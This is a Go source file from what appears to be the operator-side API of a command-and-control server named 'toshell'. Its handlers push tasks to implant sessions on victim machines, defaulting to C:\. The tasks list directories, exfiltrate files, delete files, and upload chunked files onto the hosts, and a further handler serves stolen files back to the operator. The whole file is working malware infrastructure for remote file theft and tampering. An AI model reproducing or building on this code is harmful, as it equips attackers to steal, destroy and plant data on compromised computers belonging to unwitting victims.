package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

func (s *Server) listFilesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	path := r.URL.Query().Get("path")
	if path == "" {
		path = "C:\\"
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateFileList(id, path)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "File list task pushed to session %s: %s", id, path)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      path,
		"message":   "File list task pushed",
	})
}

func (s *Server) downloadFileHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateFileDownload(id, payload.Path)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "File download task pushed to session %s: %s", id, payload.Path)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      payload.Path,
		"message":   "File download task pushed",
	})
}

func (s *Server) deleteFileHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if payload.Path == "" || strings.ContainsRune(payload.Path, 0) {
		http.Error(w, `{"error":"invalid target path"}`, http.StatusBadRequest)
		return
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateFileDelete(id, payload.Path)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "File delete task pushed to session %s: %s", id, payload.Path)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      payload.Path,
		"message":   "File delete task pushed",
	})
}

// uploadFileHandler 支持大文件直传：前端按 1MB 分片 POST。
// 非末尾分片写入服务端暂存目录 data/uploads/<sessionID>/<uploadID>；
// 末尾分片（done=true）校验完整性后创建上传任务，并异步把分片推送给植入端。
func (s *Server) uploadFileHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		UploadID string `json:"upload_id"`
		Filename string `json:"filename"`
		Path     string `json:"path"`
		Size     int64  `json:"size"`
		Offset   int64  `json:"offset"`
		Data     string `json:"data"`
		Done     bool   `json:"done"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if payload.UploadID == "" || strings.ContainsAny(payload.UploadID, `/\:`) {
		http.Error(w, `{"error":"invalid upload_id"}`, http.StatusBadRequest)
		return
	}

	if _, err := s.sessionMgr.Get(id); err != nil {
		http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
		return
	}
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	dir := filepath.Join("data", "uploads", id)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	staged := filepath.Join(dir, payload.UploadID)

	// 非末尾分片：按 offset 写入暂存文件
	if !payload.Done {
		data, err := base64.StdEncoding.DecodeString(payload.Data)
		if err != nil {
			http.Error(w, `{"error":"invalid base64 chunk"}`, http.StatusBadRequest)
			return
		}
		f, err := os.OpenFile(staged, os.O_CREATE|os.O_WRONLY, 0o644)
		if err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		if _, err := f.Seek(payload.Offset, io.SeekStart); err != nil {
			f.Close()
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		if _, err := f.Write(data); err != nil {
			f.Close()
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		f.Close()
		json.NewEncoder(w).Encode(map[string]interface{}{
			"accepted": true,
			"offset":   payload.Offset + int64(len(data)),
		})
		return
	}

	// 末尾分片：先写入该分片数据（兼容单分片/多分片，最后一段必须落盘），再校验完整性
	data, derr := base64.StdEncoding.DecodeString(payload.Data)
	if derr != nil {
		http.Error(w, `{"error":"invalid base64 chunk"}`, http.StatusBadRequest)
		return
	}
	f, oerr := os.OpenFile(staged, os.O_CREATE|os.O_WRONLY, 0o644)
	if oerr != nil {
		http.Error(w, `{"error":"`+oerr.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if _, serr := f.Seek(payload.Offset, io.SeekStart); serr != nil {
		f.Close()
		http.Error(w, `{"error":"`+serr.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if _, werr := f.Write(data); werr != nil {
		f.Close()
		http.Error(w, `{"error":"`+werr.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	f.Close()
	info, err := os.Stat(staged)
	if err != nil {
		http.Error(w, `{"error":"upload staging file missing"}`, http.StatusInternalServerError)
		return
	}
	if payload.Size > 0 && info.Size() != payload.Size {
		http.Error(w, fmt.Sprintf(`{"error":"size mismatch: got %d want %d"}`, info.Size(), payload.Size), http.StatusBadRequest)
		return
	}
	if payload.Path == "" || strings.ContainsRune(payload.Path, 0) {
		http.Error(w, `{"error":"invalid target path"}`, http.StatusBadRequest)
		return
	}

	// 创建上传任务并异步推送分片（不阻塞 HTTP 请求）。
	// 会话热迁移：Data 携带上传元数据（upload_id/filename/size），
	// 重连后监听器据此重推暂存分片（断点续传）；推送失败保留暂存文件。
	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: task.TaskTypeFileUp,
		Path:     payload.Path,
	})
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	uploadMeta, _ := json.Marshal(map[string]interface{}{
		"upload_id": payload.UploadID,
		"filename":  payload.Filename,
		"size":      payload.Size,
	})
	taskInfo.Data = string(uploadMeta) // 热迁移重推时从任务数据恢复暂存定位

	go func() {
		if err := s.listener.PushFileUpload(id, payload.UploadID, payload.Filename, payload.Path, payload.Size, taskInfo.ID); err != nil {
			// 失败：保留暂存文件供重连重推，任务标记失败由监听器重推逻辑接管
			s.taskMgr.Fail(taskInfo.ID, err.Error())
			logging.Error("api", "File upload push failed: %v", err)
			return
		}
		// 推送成功：清理暂存文件，避免残留占用磁盘
		if rmErr := os.Remove(staged); rmErr != nil && !os.IsNotExist(rmErr) {
			logging.Error("api", "Failed to remove upload staging %s: %v", staged, rmErr)
		}
	}()

	logging.Info("api", "File upload staged: %s -> %s (%d bytes, task %d)", payload.UploadID, payload.Path, payload.Size, taskInfo.ID)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"path":      payload.Path,
		"message":   "File upload task queued",
	})
}

// transferFileHandler 从服务端磁盘流式下载植入端直传的大文件。
// GET /api/v1/files/transfer?session_id=..&transfer_id=..
// 安全加固：session_id 必须是会话 ID（16 位 hex）或 UUID，防路径穿越读任意文件。
func (s *Server) transferFileHandler(w http.ResponseWriter, r *http.Request) {
	sessionID := r.URL.Query().Get("session_id")
	transferID := r.URL.Query().Get("transfer_id")
	if sessionID == "" || transferID == "" || strings.ContainsAny(transferID, `/\:`) {
		http.Error(w, `{"error":"invalid params"}`, http.StatusBadRequest)
		return
	}
	// sessionID 强校验：仅允许 hex/UUID 字符（会话 ID 由服务端生成，绝不含路径分隔符）
	if !isValidSessionID(sessionID) {
		http.Error(w, `{"error":"invalid session_id"}`, http.StatusBadRequest)
		return
	}

	dir := filepath.Join("data", "transfers", sessionID)
	// 双重防御：Clean + 前缀断言，确保 join 结果仍位于传输目录内
	cleanDir := filepath.Clean(dir)
	path := filepath.Clean(filepath.Join(dir, transferID))
	if !strings.HasPrefix(path, cleanDir+string(filepath.Separator)) {
		http.Error(w, `{"error":"invalid path"}`, http.StatusBadRequest)
		return
	}
	info, err := os.Stat(path)
	if err != nil {
		// 404 诊断：区分「会话目录缺失 / 主文件缺失」两种场景，
		// 前者多为会话 ID 错位（多 C2 / 植入端版本不匹配），
		// 后者多为直传未落盘（连接中断 / 写入失败）。
		diag := map[string]interface{}{
			"error":        "transfer not found",
			"transfer_id":  transferID,
			"session_id":   sessionID,
			"target":       path,
			"has_dir":      false,
			"has_file":     false,
			"has_meta":     false,
			"dir_entries":  []string{},
		}
		if dInfo, derr := os.Stat(dir); derr == nil {
			diag["has_dir"] = true
			if dInfo.IsDir() {
				if entries, eerr := os.ReadDir(dir); eerr == nil {
					names := make([]string, 0, len(entries))
					for _, e := range entries {
						names = append(names, e.Name())
					}
					diag["dir_entries"] = names
				}
			}
		}
		if _, merr := os.Stat(path + ".meta"); merr == nil {
			diag["has_meta"] = true
		}
		body, _ := json.Marshal(diag)
		logging.Warn("api", "transfer download 404: %s", body)
		http.Error(w, string(body), http.StatusNotFound)
		return
	}

	// 使用 .meta 中的原始文件名作为下载名
	filename := transferID
	if data, err := os.ReadFile(path + ".meta"); err == nil {
		var m struct {
			Filename string `json:"filename"`
		}
		if json.Unmarshal(data, &m) == nil && m.Filename != "" {
			filename = m.Filename
		}
	}

	f, err := os.Open(path)
	if err != nil {
		http.Error(w, `{"error":"transfer not found"}`, http.StatusNotFound)
		return
	}
	defer f.Close()

	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	http.ServeContent(w, r, filename, info.ModTime(), f)
}

// isValidSessionID 校验会话 ID 格式：16 位 hex（TCP/WS 会话）或 UUID（预留）。
// 用于路径拼接前的强校验，防路径穿越（session_id 绝不含路径分隔符）。
func isValidSessionID(id string) bool {
	if len(id) == 16 {
		for _, c := range id {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				return false
			}
		}
		return true
	}
	// UUID: 8-4-4-4-12
	if len(id) == 36 {
		for i, c := range id {
			if i == 8 || i == 13 || i == 18 || i == 23 {
				if c != '-' {
					return false
				}
				continue
			}
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				return false
			}
		}
		return true
	}
	return false
}
